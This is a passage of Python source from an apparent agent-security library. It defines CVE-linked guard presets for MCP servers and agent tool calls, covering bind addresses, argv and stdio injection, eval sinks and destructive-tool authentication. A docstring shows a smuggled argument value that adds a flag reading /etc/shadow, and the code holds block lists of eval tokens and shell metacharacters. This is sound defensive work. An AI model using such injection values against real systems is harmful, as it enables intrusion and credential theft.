            redact_sse_payloads=True,
        ),
        "harness_tools": DEFAULT_HARNESS_TOOLS,
        "beta_header": MANAGED_AGENTS_BETA_HEADER,
        "toolset_version": AGENT_TOOLSET_VERSION,
        "source": "https://claude.com/blog/claude-managed-agents",
    }


# -----------------------------------------------------------------------------
# CVE-2026-23744 — MCPJam Inspector bind-address regression (v0.5.6+)
# -----------------------------------------------------------------------------

_DEV_SERVER_TOOL_NAME_PATTERN = re.compile(r"(?i)^(?:mcpjam|inspector|dev[-_ ]?server|studio)\b")


def mcpjam_cve_2026_23744_defaults() -> dict[str, Any]:
    """Return the bind-address guard for CVE-2026-23744 (MCPJam ≤ 1.4.2).

    GHSA-232v-j27c-5pp6 (CVSS 9.8) — MCPJam Inspector ≤ 1.4.2 bound
    to ``0.0.0.0`` by default with no auth. Patched in 1.4.3. The
    bug class generalises to any local MCP dev server: bind to a
    public address without auth = LAN-reachable RCE.

    Contract::

        cfg = mcpjam_cve_2026_23744_defaults()
        cfg["check"](tool_name, addr, auth_required=True)

    The ``check`` callable matches ``tool_name`` against the dev-server
    name pattern (``mcpjam`` / ``inspector`` / ``dev-server`` /
    ``studio``) and validates ``addr`` against the bind-address guard.
    Tools outside the pattern are unaffected — this preset is
    deliberately scoped to known-dev-server tool name shapes.

    Primary source:
      https://github.com/advisories/GHSA-232v-j27c-5pp6
    """
    from .mcp_spec.bind_address_guard import (
        BindAddressGuardConfig,
        validate_bind_address,
    )

    def check(
        tool_name: str,
        addr: str,
        *,
        auth_required: bool = False,
        allow_public_bind: bool = False,
    ) -> None:
        if not _DEV_SERVER_TOOL_NAME_PATTERN.match(tool_name or ""):
            return
        cfg = BindAddressGuardConfig(
            allow_public_bind=allow_public_bind,
            auth_required=auth_required,
        )
        validate_bind_address(addr, cfg)

    return {
        "check": check,
        "tool_name_pattern": _DEV_SERVER_TOOL_NAME_PATTERN.pattern,
        "source": ("https://github.com/advisories/GHSA-232v-j27c-5pp6"),
    }


# -----------------------------------------------------------------------------
# CVE-2026-39884 — flux159/mcp-server-kubernetes argv flag-injection (v0.5.6+)
# -----------------------------------------------------------------------------

_KUBECTL_PORT_FORWARD_PATTERN = re.compile(r"(?i)port_?forward")

# Field names the SentinelOne advisory called out as injection-prone
# in ``port_forward``/kubectl handlers. The CVE-2026-39884 fix in
# ``mcp-server-kubernetes`` 3.5.0 added per-field validation for
# exactly these.
_KUBECTL_INJECTION_PRONE_FIELDS: tuple[str, ...] = (
    "namespace",
    "resourceType",
    "resourceName",
    "localPort",
    "targetPort",
)


def flux159_mcp_kubernetes_cve_2026_39884_defaults() -> dict[str, Any]:
    """Return the kubectl argv-injection check for CVE-2026-39884.

    The MCP server ``flux159/mcp-server-kubernetes`` (≤ 3.4.x) built
    kubectl invocations by string-concatenating user-controlled fields
    like ``localPort`` into a single argv element. A value such as
    ``"8080 --kubeconfig=/etc/shadow"`` thereby became extra flags
    rather than data. SentinelOne disclosed 2026-04-14; fixed in 3.5.0.

    Different injection class than v0.5.5's CVE-2026-5023 codebase-mcp
    preset: that one rejects shell metacharacters; this one rejects
    space-injected flag concatenation with no metacharacter present.

    Contract::

        cfg = flux159_mcp_kubernetes_cve_2026_39884_defaults()
        cfg["check"](tool_name, fields_dict)
        # Raises ArgvStringConcatenationError if any injection-prone
        # field carries a value that would survive shlex.quote unwrapped.

    Primary source:
      https://www.sentinelone.com/vulnerability-database/cve-2026-39884/
    """
    from .mcp_spec.argv_guard import (
        ArgvStringConcatenationError,
        enforce_argv_array,
    )

    def check(tool_name: str, fields: dict[str, Any]) -> None:
        if not _KUBECTL_PORT_FORWARD_PATTERN.search(tool_name or ""):
            return
        ordered_fields = [f for f in _KUBECTL_INJECTION_PRONE_FIELDS if f in fields]
        argv = [str(fields[f]) for f in ordered_fields]
        try:
            enforce_argv_array(argv, field_names=ordered_fields)
        except ArgvStringConcatenationError:
            raise

    return {
        "check": check,
        "tool_name_pattern": _KUBECTL_PORT_FORWARD_PATTERN.pattern,
        "injection_prone_fields": _KUBECTL_INJECTION_PRONE_FIELDS,
        "source": ("https://www.sentinelone.com/vulnerability-database/cve-2026-39884/"),
    }


# -----------------------------------------------------------------------------
# CVE-2026-33032 "MCPwn" — destructive-tool auth-middleware regression preset
# -----------------------------------------------------------------------------

# Matches write / exec / kill / destructive verbs. Expanded from the
# 12 nginx-ui tool names cataloged in the Rapid7 write-up.
_DESTRUCTIVE_TOOL_PATTERN = re.compile(
    r"(?i)^(?:"
    r"delete|destroy|drop|erase|purge|"
    r"install|uninstall|upload|overwrite|"
    r"reload|restart|stop|start|kill|"
    r"configure|enable|disable|patch|"
    r"run_shell|exec|execute|shell|"
    r"backup_restore|rollback|factory_reset"
    r").*$"
)

# Middleware identifiers we DO accept as enforcing real authentication.
# "ip_allowlist" alone is NOT accepted — nginx-ui's default was 0.0.0.0/0.
_TRUSTED_AUTH_MIDDLEWARES: frozenset[str] = frozenset(
    {
        "AuthRequired",
        "SessionRequired",
        "BearerRequired",
        "OIDCRequired",
        "OAuthRequired",
    }
)


class UnauthenticatedDestructiveToolError(AirlockError):
    """Raised when a destructive MCP tool lacks authenticating middleware."""


def is_destructive_tool(tool_name: str) -> bool:
    """Return True iff ``tool_name`` matches the destructive-verb pattern.

    Public so users can pre-classify their own tool catalogs before
    handing them to :func:`mcpwn_cve_2026_33032_check`.
    """
    return bool(_DESTRUCTIVE_TOOL_PATTERN.match(tool_name or ""))


def mcpwn_cve_2026_33032_check(
    tools: list[dict[str, Any]],
) -> None:
    """Assert every destructive tool is wrapped in real auth middleware.

    Args:
        tools: A list of tool manifests. Each entry must carry:
            - ``name`` (str): the MCP tool name.
            - ``middlewares`` (list[str]): the middleware names applied
              to the tool's HTTP endpoint, in order.

    Raises:
        UnauthenticatedDestructiveToolError: When a destructive tool
            name (see :func:`is_destructive_tool`) is present but no
            middleware in :data:`_TRUSTED_AUTH_MIDDLEWARES` is applied
            to it. Raised as soon as the first offender is found — the
            error details identify it.
    """
    for tool in tools:
        name = tool.get("name", "")
        if not is_destructive_tool(name):
            continue
        middlewares = tool.get("middlewares") or []
        has_auth = any(m in _TRUSTED_AUTH_MIDDLEWARES for m in middlewares)
        if not has_auth:
            raise UnauthenticatedDestructiveToolError(
                f"destructive MCP tool {name!r} exposes no "
                f"authenticating middleware (saw {middlewares!r}). "
                "Regression class: CVE-2026-33032 (nginx-ui MCPwn). "
                "See https://nvd.nist.gov/vuln/detail/CVE-2026-33032"
            )


def mcpwn_cve_2026_33032_defaults() -> dict[str, Any]:
    """Preset-style factory returning the MCPwn audit config.

    Because this preset's output is the checker function itself rather
    than a ``SecurityPolicy``, the return value is a small mapping that
    a caller uses like::

        from agent_airlock.policy_presets import mcpwn_cve_2026_33032_defaults

        cfg = mcpwn_cve_2026_33032_defaults()
        cfg["check"](my_tool_manifests)

    Primary source: https://nvd.nist.gov/vuln/detail/CVE-2026-33032
    """
    return {
        "check": mcpwn_cve_2026_33032_check,
        "is_destructive": is_destructive_tool,
        "trusted_middlewares": _TRUSTED_AUTH_MIDDLEWARES,
        "source": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33032, "
            "https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/"
        ),
    }


# -----------------------------------------------------------------------------
# CVE-2025-59528 Flowise CustomMCP RCE — eval/Function() tool-manifest ban
# -----------------------------------------------------------------------------

# Tokens whose presence inside a tool manifest's ``handler`` or
# ``config`` string means user input reaches JS dynamic-evaluation.
# Primary sources:
#   https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/
#   https://advisories.gitlab.com/npm/flowise/CVE-2025-59528/
_EVAL_TOKENS: tuple[str, ...] = (
    "Function(",
    "new Function",
    "eval(",
    "Deno.eval",
    "vm.runInNewContext",
)


class FlowiseEvalTokenError(AirlockError):
    """Raised when a tool manifest embeds a JS dynamic-eval token."""


def flowise_cve_2025_59528_check(tools: list[dict[str, Any]]) -> None:
    """Reject any tool whose handler or config embeds a JS eval token.

    The Flowise CustomMCP RCE (CVE-2025-59528, CVSS 10.0) passed user-
    supplied strings from ``/api/v1/node-load-method/customMCP`` into
    the JavaScript ``Function()`` constructor. CSA documented active
    exploitation in April 2026 despite a September 2025 patch. This
    check makes the class non-transportable: if a manifest carries
    any of the banned tokens, refuse to register the tool.

    Args:
        tools: Tool manifests. Each entry may carry ``handler`` and/or
            ``config`` string fields.

    Raises:
        FlowiseEvalTokenError: First offender wins; error message names
            the tool and the banned token.
    """
    for tool in tools:
        for field_name in ("handler", "config"):
            value = tool.get(field_name)
            if not isinstance(value, str):
                continue
            for token in _EVAL_TOKENS:
                if token in value:
                    raise FlowiseEvalTokenError(
                        f"tool {tool.get('name', '<unnamed>')!r} "
                        f"field {field_name!r} contains banned JS "
                        f"eval token {token!r}. Regression class: "
                        "CVE-2025-59528 (Flowise CustomMCP RCE). "
                        "See https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/"
                    )


def high_value_action_deny_by_default() -> dict[str, Any]:
    """Deny-by-default preset for financial / on-chain / high-value tools.

    Motivation: the 2026-04-19 Kelp DAO LayerZero bridge exploit ($292M
    stolen, ~$200M Aave bad debt) started with a cross-chain message
    forgery that reached an agent authorizing a collateral move. Any
    tool whose name implies money movement should require explicit
    opt-in.

    This preset tags a tool as "high-value" when its name matches
    ``(?i)(transfer|bridge|approve|withdraw|borrow|liquidate|swap|mint|burn)``
    and refuses to run it unless the ``@airlock`` caller passes
    ``allow_high_value=True``.

    Usage::

        from agent_airlock.policy_presets import (
            high_value_action_deny_by_default,
            HighValueActionBlocked,
        )

        cfg = high_value_action_deny_by_default()
        cfg["check"]("transfer", allow_high_value=False)   # raises
        cfg["check"]("transfer", allow_high_value=True)    # passes
        cfg["check"]("read_balance", allow_high_value=False)  # passes

    Primary sources:
      - https://www.bloomberg.com/news/articles/2026-04-19/crypto-hack-worth-290-million-triggers-defi-contagion-shock
      - https://thedefiant.io/news/defi/aave-price-crash-kelpdao-exploit-whale-dump-rxi8o9
    """
    pattern = re.compile(r"(?i)(transfer|bridge|approve|withdraw|borrow|liquidate|swap|mint|burn)")

    def is_high_value(tool_name: str) -> bool:
        return bool(pattern.search(tool_name or ""))

    def check(tool_name: str, allow_high_value: bool = False) -> None:
        if is_high_value(tool_name) and not allow_high_value:
            raise HighValueActionBlocked(
                f"tool {tool_name!r} matches the high-value pattern "
                f"({pattern.pattern!r}) and requires allow_high_value=True. "
                "Motivating incident: Kelp DAO LayerZero exploit 2026-04-19."
            )

    return {
        "check": check,
        "is_high_value": is_high_value,
        "pattern": pattern.pattern,
        "source": (
            "https://www.bloomberg.com/news/articles/2026-04-19/crypto-hack-worth-290-million-triggers-defi-contagion-shock"
        ),
    }


class HighValueActionBlocked(AirlockError):
    """Raised when a high-value action runs without explicit opt-in."""


def flowise_cve_2025_59528_defaults() -> dict[str, Any]:
    """Preset-style factory returning the Flowise-eval checker.

    Usage::

        from agent_airlock.policy_presets import flowise_cve_2025_59528_defaults

        cfg = flowise_cve_2025_59528_defaults()
        cfg["check"](my_tool_manifests)

    Primary source:
      https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/
    """
    return {
        "check": flowise_cve_2025_59528_check,
        "banned_tokens": _EVAL_TOKENS,
        "source": (
            "https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/"
        ),
    }


def mcp_inspector_exposure_guard_defaults(
    *,
    inspector_ports: frozenset[int] | None = None,
) -> dict[str, Any]:
    """Recommended config for the MCP Inspector exposure guard (v0.8.0+).

    CVE-2026-23744: MCPJam Inspector ≤ 1.4.2 binds to 0.0.0.0 by
    default with no auth, enabling remote install + execution of
    malicious MCP servers. This preset wires
    :class:`agent_airlock.mcp_spec.inspector_exposure_guard.InspectorExposureGuard`
    with the curated inspector port range (6274-6277). Complementary
    to v0.5.x ``bind_address_guard.py`` — that guard fires at config
    time, this one runs a runtime listener-scan on ``/proc/net/tcp``.

    Primary source:
      https://github.com/boroeurnprach/CVE-2026-23744-PoC
    """
    from .mcp_spec.inspector_exposure_guard import DEFAULT_INSPECTOR_PORTS

    return {
        "preset_id": "mcp_inspector_exposure_guard_2026_23744",
        "severity": "high",
        "default_action": "deny",
        "advisory_url": "https://github.com/boroeurnprach/CVE-2026-23744-PoC",
        "cves": ("CVE-2026-23744",),
        "inspector_ports": (
            inspector_ports if inspector_ports is not None else DEFAULT_INSPECTOR_PORTS
        ),
    }


def stdio_guard_eval_defaults_2026_05_15(
    *,
    extra_sinks: frozenset[str] = frozenset(),
    extra_vulnerable_packages: tuple[tuple[str, str], ...] = (),
) -> dict[str, Any]:
    """Recommended config for the bare-eval RCE guard (CVE-2026-44717 anchor, v0.8.0+).

    NVD 2026-05-15: MCP Calculate Server < 0.1.1 uses ``eval()`` to
    evaluate mathematical expressions without input sanitization,
    leading to RCE. Patched in 0.1.1 by pinning ``local_dict``.

    Complementary to v0.7.5 ``semantic_kernel_filter_eval_rce_2026_25592_26030_defaults``:
    that preset targets ``lambda`` / ``Expression.Lambda<>`` syntax;
    this one targets bare ``eval(`` / ``parse_expr(`` calls.

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-44717
    """
    from .mcp_spec.eval_rce_guard import DEFAULT_EVAL_SINKS, DEFAULT_VULNERABLE_PACKAGES

    return {
        "preset_id": "stdio_guard_eval_defaults_2026_05_15",
        "severity": "critical",
        "default_action": "deny",
        "advisory_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44717",
        "cves": ("CVE-2026-44717",),
        "sinks": DEFAULT_EVAL_SINKS | extra_sinks,
        "extra_sinks": extra_sinks,
        "vulnerable_packages": DEFAULT_VULNERABLE_PACKAGES + extra_vulnerable_packages,
    }


# Default tool-name patterns for the MCP Calculate-Server class. Operators
# extend via ``extra_tool_name_patterns`` on the factory below.
_CALC_SERVER_TOOL_NAME_PATTERNS: tuple[str, ...] = (
    "calc",
    "calculate",
    "evaluate",
    "math_eval",
    "sympy_eval",
)


def mcp_calc_server_bundle_defaults_2026_05_15(
    *,
    extra_sinks: frozenset[str] = frozenset(),
    extra_metachars: frozenset[str] = frozenset(),
    extra_tool_name_patterns: tuple[str, ...] = (),
) -> dict[str, Any]:
    """Composition preset for the MCP Calculate-Server class (CVE-2026-44717 anchor, v0.8.1+).

    Honest framing: this preset does **not** introduce a new runtime
    detector. It composes two existing guards under a single
    ``preset_id`` namespace so security teams cataloguing
    CVE-2026-44717 coverage have one row to point to:

    - v0.8.0 :class:`agent_airlock.mcp_spec.eval_rce_guard.EvalRCEGuard`
      via :func:`stdio_guard_eval_defaults_2026_05_15` — catches the
      bare-eval / parse_expr sinks.
    - v0.7.6 :class:`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
      via :func:`mcp_stdio_command_injection_preset_defaults` —
      catches shell metachars in argv vectors that often arrive at
      ``calculate``-shaped tools that shell out for ``bc`` /
      ``python -c``.

    The bundle is scoped to a curated tool-name pattern set
    (``calc``, ``calculate``, ``evaluate``, ``sympy_eval``,
    ``math_eval``) — at the policy layer this scoping is how the
    two underlying guards are applied selectively to calc-server
    class tools.

    Operators wanting bare-eval detection on every tool regardless
    of name should keep using :func:`stdio_guard_eval_defaults_2026_05_15`
    directly. This preset is the per-tool-class projection of that
    surface.

    Args:
        extra_sinks: Additional eval-sink labels on top of
            :data:`agent_airlock.mcp_spec.eval_rce_guard.DEFAULT_EVAL_SINKS`.
        extra_metachars: Additional shell metachars on top of the
            v0.7.6 default block-list.
        extra_tool_name_patterns: Additional tool-name patterns on
            top of the curated calc-server class set.

    Raises:
        TypeError: if any of the override args is not the documented
            collection type.

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-44717
    """
    from .mcp_spec.eval_rce_guard import DEFAULT_EVAL_SINKS, DEFAULT_VULNERABLE_PACKAGES

    if not isinstance(extra_sinks, frozenset):
        raise TypeError(f"extra_sinks must be a frozenset[str]; got {type(extra_sinks).__name__}")
    if not isinstance(extra_metachars, frozenset):
        raise TypeError(
            f"extra_metachars must be a frozenset[str]; got {type(extra_metachars).__name__}"
        )
    if not isinstance(extra_tool_name_patterns, tuple):
        raise TypeError(
            "extra_tool_name_patterns must be a tuple of str; got "
            f"{type(extra_tool_name_patterns).__name__}"
        )

    return {
        "preset_id": "mcp_calc_server_bundle_2026_05_15",
        "severity": "critical",
        "default_action": "deny",
        "advisory_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44717",
        "cves": ("CVE-2026-44717",),
        "tool_name_patterns": _CALC_SERVER_TOOL_NAME_PATTERNS + extra_tool_name_patterns,
        "eval_sinks": DEFAULT_EVAL_SINKS | extra_sinks,
        "vulnerable_packages": DEFAULT_VULNERABLE_PACKAGES,
        "extra_metachars": extra_metachars,
        "composes": (
            "stdio_guard_eval_defaults_2026_05_15",
            "mcp_stdio_command_injection_preset_defaults",
        ),
    }


def metis_inspired_corpus_block_rate_regression_defaults_2026_05_18(
    *,
    baseline_block_rate: float = 0.68,
    drift_threshold: float = 0.05,
) -> dict[str, Any]:
    """Recommended config for the v0.8.2 Metis-inspired corpus block-rate regression.

    Wires :class:`agent_airlock.regression_corpus.MetisInspiredCorpusBlockRateGuard`
    against agent-airlock's deterministic exploit-shape corpus
    (``tests/cves/corpora/metis_inspired_corpus_2026_05_18.json``).
    The gate fires when block rate drops below
    ``baseline_block_rate - drift_threshold``.

    Honest framing
    --------------
    This preset does NOT reproduce the Metis paper's POMDP attacker.
    Metis (arXiv:2605.10067, ICML 2026) is an adaptive attacker
    against a closed-loop LLM measuring response-level ASR.
    agent-airlock is a tool-call argument validator. The corpus
    here is fixed, derived from agent-airlock's own CVE fixtures,
    and measures **block rate** (inverse of ASR) on the guard chain
    — the Metis citation is motivational, not a claim of metric
    equivalence.

    Args:
        baseline_block_rate: Canonical first-run block rate locked
            into CI. Default 0.68 reflects the v0.8.2 corpus + the
            default (EvalRCEGuard + StdioCommandInjectionGuard) chain.
        drift_threshold: Allowed downward drift before the gate fires.
            Default 0.05 (5%).

    Raises:
        ValueError: ``baseline_block_rate`` outside ``[0.0, 1.0]`` or
            ``drift_threshold`` negative.

    Primary source:
      https://arxiv.org/abs/2605.10067
    """
    if not (0.0 <= baseline_block_rate <= 1.0):
        raise ValueError(f"baseline_block_rate must be in [0.0, 1.0]; got {baseline_block_rate!r}")
    if drift_threshold < 0.0:
        raise ValueError(f"drift_threshold must be non-negative; got {drift_threshold!r}")
    return {
        "preset_id": "metis_inspired_corpus_block_rate_regression_2026_05_18",
        "severity": "high",
        "default_action": "fail_release_gate",
        "advisory_url": "https://arxiv.org/abs/2605.10067",
        "anchor_paper": "Metis (arXiv:2605.10067, ICML 2026)",
        "fixture_path": "tests/cves/corpora/metis_inspired_corpus_2026_05_18.json",
        "guard_chain": "EvalRCEGuard + StdioCommandInjectionGuard",
        "baseline_block_rate": float(baseline_block_rate),
        "drift_threshold": float(drift_threshold),
        "honest_scope": (
            "Block-rate (inverse of ASR) regression on a deterministic "
            "exploit-shape corpus. NOT a reproduction of the Metis POMDP "
            "attacker — the paper is cited as motivation only."
        ),
    }


def stainless_provenance_probe_defaults(
    *,
    extra_ua_patterns: frozenset[str] = frozenset(),
    extra_body_markers: tuple[str, ...] = (),
) -> dict[str, Any]:
    """Recommended config for the v0.8.3 Stainless SDK-provenance probe.

    Wires :func:`agent_airlock.sdk_provenance.classify_sdk_lineage` to
    the default Stainless marker pattern sets. The preset is **visibility-
    only** — ``default_action`` is ``tag_only``. agent-airlock does NOT
    automatically intercept HTTP; operators call the classifier from
    their own audit hooks and attach the result onto trajectory events.

    Honest scope
    ------------
    This preset does NOT block, deny, or refuse anything. It is a
    classifier preset that returns marker pattern sets. agent-airlock's
    decorator wraps a Python tool function — it does not see outbound
    HTTP headers itself. The ``decorator-in-process`` model is a
    deliberate anti-pivot choice (in-process decorator, not a proxy/sidecar).

    Anchor
    ------
    Anthropic announced the acquisition of Stainless on 2026-05-13
    and the wind-down of hosted Stainless products. Operators wanting
    visibility into MCP servers generated by the deprecated Stainless
    toolchain can use this preset's pattern set.

    Args:
        extra_ua_patterns: Additional User-Agent header substrings
            (case-insensitive) to flag on top of
            :data:`agent_airlock.sdk_provenance.DEFAULT_STAINLESS_UA_PATTERNS`.
        extra_body_markers: Additional response-body banner substrings
            (case-insensitive) to flag on top of
            :data:`agent_airlock.sdk_provenance.DEFAULT_STAINLESS_BODY_MARKERS`.

    Raises:
        TypeError: ``extra_ua_patterns`` is not a frozenset, or
            ``extra_body_markers`` is not a tuple.

    Primary source:
      https://www.anthropic.com/news/anthropic-acquires-stainless
    """
    from .sdk_provenance import DEFAULT_STAINLESS_BODY_MARKERS, DEFAULT_STAINLESS_UA_PATTERNS

    if not isinstance(extra_ua_patterns, frozenset):
        raise TypeError(
            f"extra_ua_patterns must be a frozenset[str]; got {type(extra_ua_patterns).__name__}"
        )
    if not isinstance(extra_body_markers, tuple):
        raise TypeError(
            f"extra_body_markers must be a tuple of str; got {type(extra_body_markers).__name__}"
        )

    return {
        "preset_id": "stainless_provenance_probe_2026_05_19",
        "severity": "info",
        "default_action": "tag_only",
        "advisory_url": "https://www.anthropic.com/news/anthropic-acquires-stainless",
        "anchor_event": "Anthropic acquires Stainless (2026-05-13); hosted SDK generator winding down",
        "ua_patterns": DEFAULT_STAINLESS_UA_PATTERNS | extra_ua_patterns,
        "body_markers": DEFAULT_STAINLESS_BODY_MARKERS + extra_body_markers,
        "honest_scope": (
            "Visibility-only classifier preset. Returns marker pattern sets "
            "the operator passes to classify_sdk_lineage() from their own "
            "audit hooks. agent-airlock does NOT auto-intercept HTTP."
        ),
    }


def openapi_doc_drift_guard_defaults(
    *,
    spec: Mapping[str, Any],
    drift_mode: str = "strict",
) -> dict[str, Any]:
    """Recommended config for the v0.8.1 OpenAPI Drift Guard.

    Wires :class:`agent_airlock.mcp_spec.openapi_drift_guard.OpenAPIDriftGuard`
    to the operator-supplied OpenAPI 3.x spec at the configured
    drift mode. The Hermes paper (arXiv:2605.14312) finding maps to
    a runtime body-shape gate one layer above the v0.7.x / v0.8.0
    exploit-shape guards.

    Args:
        spec: Parsed OpenAPI document as a dict. The caller is
            responsible for loading and parsing — agent-airlock does
            not import PyYAML or any spec-loader.
        drift_mode: ``"strict"`` (default) / ``"warn"`` / ``"shadow"``.

    Raises:
        TypeError: ``spec`` is not a mapping.
        ValueError: ``drift_mode`` is unknown.

    Primary source:
      https://arxiv.org/abs/2605.14312
    """
    if not isinstance(spec, Mapping):
        raise TypeError(f"spec must be a dict-like mapping; got {type(spec).__name__}")
    if drift_mode not in ("strict", "warn", "shadow"):
        raise ValueError(f"drift_mode must be 'strict'|'warn'|'shadow'; got {drift_mode!r}")
    return {
        "preset_id": "openapi_doc_drift_guard_2026_05_17",
        "severity": "medium",
        "default_action": "deny" if drift_mode == "strict" else "allow",
        "advisory_url": "https://arxiv.org/abs/2605.14312",
        "drift_mode": drift_mode,
        "spec": dict(spec),
    }


def npm_oidc_publish_window_guard_defaults(
    *,
    blast_list: frozenset[tuple[str, str, str]] | None = None,
) -> dict[str, Any]:
    """Recommended config for the TanStack 2026-05-11 OIDC publish-window guard.

    The TanStack 2026-05-11 postmortem disclosed that an attacker
    extracted the runner's OIDC token directly from ``/proc/<pid>/maps``
    and ``/proc/<pid>/mem`` of the Runner.Worker process and used it
    to republish 42 packages × 84 versions outside the workflow's own
    publish step. Airlock's runtime surface for this class is "agent
    that fetches / runs just-mutated package versions should reject
    blast-list pairs". This preset wires
    :class:`agent_airlock.mcp_spec.oidc_publish_window_guard.OIDCPublishWindowGuard`
    with the curated 2026-05-11 blast list (TanStack postmortem + Aikido
    cross-ecosystem advisory).

    The list is a frozenset of ``(ecosystem, name, version)`` tuples.
    Operators on a non-default vocabulary can pass their own list.

    Primary sources:
      https://tanstack.com/blog/npm-supply-chain-compromise-postmortem
      https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised
    """
    from .mcp_spec.oidc_publish_window_guard import load_blast_list_from_2026_05_11

    return {
        "preset_id": "npm_oidc_publish_window_guard_2026_05_11",
        "severity": "critical",
        "default_action": "deny",
        "advisory_url": ("https://tanstack.com/blog/npm-supply-chain-compromise-postmortem"),
        "cross_ecosystem_url": (
            "https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised"
        ),
        "incident_id": "tanstack-oidc-blast-2026-05-11",
        "blast_list": (blast_list if blast_list is not None else load_blast_list_from_2026_05_11()),
    }


def mcp_stdio_command_injection_preset_defaults(
    *,
    cwd_allowlist: tuple[str, ...] = (),
    extra_metachars: frozenset[str] = frozenset(),
) -> dict[str, Any]:
    """Recommended config for the MCP STDIO command-injection guard.

    Snyk ToxicSkills disclosed via Help Net Security 2026-05-05 that
    "1 in 4 MCP servers opens AI agent security to code execution
    risk". MCP STDIO transport accepts an argv vector that often
    arrives via the model's tool-call payload — a shell metachar in
    any element opens an injection path.

    This preset wires
    :class:`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
    with a default block-list of shell metachars (``;``, ``&&``,
    ``||``, ``|``, newline, backtick, ``$(``) plus a path-traversal
    detector (``../`` outside an operator-supplied cwd allowlist).

    Primary source:
      https://www.helpnetsecurity.com/2026/05/05/ai-agent-security-skills-blind-spots/
    """
    return {
        "preset_id": "mcp_stdio_command_injection_2026_05_05",
        "severity": "critical",
        "default_action": "deny",
        "advisory_url": (
            "https://www.helpnetsecurity.com/2026/05/05/ai-agent-security-skills-blind-spots/"
        ),
        "cwd_allowlist": cwd_allowlist,
        "extra_metachars": extra_metachars,
    }


# Tool-name patterns that route through Flowise's MCP stdio adapter. The
# Flowise CustomMCP node serialises a user-defined ``command`` + ``args``
# straight into a child-process spawn; these are the canonical tool-call
# shapes the adapter exposes. Scoping the guard to these names keeps it
# from second-guessing argv on unrelated tools.
_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS: tuple[str, ...] = (
    "customMCP",
    "custom_mcp",
    "mcp_stdio",
    "stdio_mcp",
    "flowise_mcp",
    "mcp_server_stdio",
)


class FlowiseMcpStdioInjectionError(AirlockError):
    """Raised when a Flowise MCP-stdio adapter command carries an
    injection shape (CVE-2026-40933).

    Stores the underlying :class:`StdioCommandInjectionDecision` reason
    code + matched token as attributes so callers can branch on the
    specific deny reason, per the project's exception convention.
    """

    def __init__(
        self,
        message: str,
        *,
        verdict: str,
        matched_metachar: str | None = None,
        matched_path: str | None = None,
    ) -> None:
        super().__init__(message)
        self.verdict = verdict
        self.matched_metachar = matched_metachar
        self.matched_path = matched_path


def flowise_mcp_stdio_guard_2026_defaults(
    *,
    cwd_allowlist: tuple[str, ...] = (),
    extra_metachars: frozenset[str] = frozenset(),
    extra_tool_name_patterns: tuple[str, ...] = (),
) -> dict[str, Any]:
    """Defensive bundle for CVE-2026-40933 (Flowise MCP-stdio adapter RCE).

    Flowise ≤ 3.0.x lets an authenticated user define a CustomMCP server
    with the **stdio** transport, supplying an arbitrary ``command`` +
    ``args`` that Flowise serialises straight into a child-process spawn
    on the server — no sandbox, no argv sanitisation. Importing a
    crafted chatflow is a one-click path to OS-level RCE with the
    Flowise process's privileges (often root in containers). CVSS 9.9.
    Fixed upstream in Flowise 3.1.0; the only complete mitigation Ox /
    Obsidian recommend short of upgrading is disabling stdio MCP
    (``CUSTOM_MCP_PROTOCOL=sse``). This preset is the agent-airlock-side
    control for deployments that cannot do either yet.

    NVD / advisory excerpt (retrieved 2026-06-04)::

        "Due to unsafe serialization of stdio commands in the MCP
         adapter, an authenticated attacker can add an MCP stdio
         server with an arbitrary command, achieving command
         execution." (GitLab/GitHub advisory, CVSS 9.9)

    Honest framing — this preset introduces **no new runtime detector**.
    It is a per-tool-class projection of the existing v0.7.6
    :class:`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
    (the same primitive :func:`mcp_stdio_command_injection_preset_defaults`
    wires), scoped to the Flowise MCP-stdio adapter tool-name surface
    (``customMCP`` and friends). It does NOT invent a new registration
    mechanism: like every other per-CVE preset it returns a
    ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
    ``default_action`` / ``advisory_url`` / ``cves`` keys, and is
    discoverable via :func:`list_active`.

    Fail-closed posture:

    - **Shell-metachar / unsanitised-arg construction** in the stdio
      command path (``command`` field or any ``args`` element) →
      ``DENY_SHELL_METACHAR``. The metachar set (``;``, ``&&``, ``||``,
      ``|``, newline, carriage return, backtick, ``$(``) is the v0.7.6
      default; extend via ``extra_metachars``.
    - **Path traversal** outside an operator-supplied ``cwd_allowlist``
      → ``DENY_PATH_TRAVERSAL`` (opt-in; empty allowlist disables it).
    - **Unknown serialization** (anything that isn't a recognised
      benign argv shape) fails closed: the guard's ``evaluate`` returns
      ``allowed`` only when no injection pattern matched, so a payload
      whose ``command`` carries any metachar is denied rather than
      passed through.

    OWASP mapping: **MCP05 Command Injection** (OWASP MCP Top-10 2026,
    beta). Composes cleanly with
    :func:`owasp_mcp_top_10_2026_policy`.

    Args:
        cwd_allowlist: Absolute path prefixes the Flowise process is
            permitted to spawn within. Empty (default) disables the
            traversal check, leaving only the metachar gate.
        extra_metachars: Additional shell metachars to block on top of
            the v0.7.6 default set.
        extra_tool_name_patterns: Additional Flowise-stdio tool-name
            patterns on top of the canonical
            :data:`_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS`.

    Returns:
        ``dict[str, Any]`` with:

        - ``preset_id`` — ``"flowise_mcp_stdio_guard_2026"``.
        - ``severity`` — ``"critical"`` (CVSS 9.9).
        - ``default_action`` — ``"deny"``.
